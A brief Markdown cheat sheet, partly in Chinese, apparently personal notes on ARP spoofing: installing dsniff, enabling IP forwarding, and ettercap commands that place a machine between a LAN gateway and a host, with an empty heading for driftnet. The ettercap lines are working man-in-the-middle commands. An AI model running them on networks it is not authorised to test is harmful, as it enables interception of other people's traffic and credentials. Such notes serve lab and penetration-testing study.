# arp

## arpspoof
1. install
```shell
apt install dsniff
```
2. 开启IP转发
```shell
# Linux root user
echo 1 >/proc/sys/net/ipv4/ip_forward
```
3. 查看IP转发
```shell
sudo sysctl -a | grep forward
```

## ettercap
```shell
# arp spoof
sudo ettercap -T -M arp /192.168.31.1// /192.168.31.68//
#
sudo ettercap -T -M arp:remote /192.168.31.1// /192.168.31.68//
```

## driftnet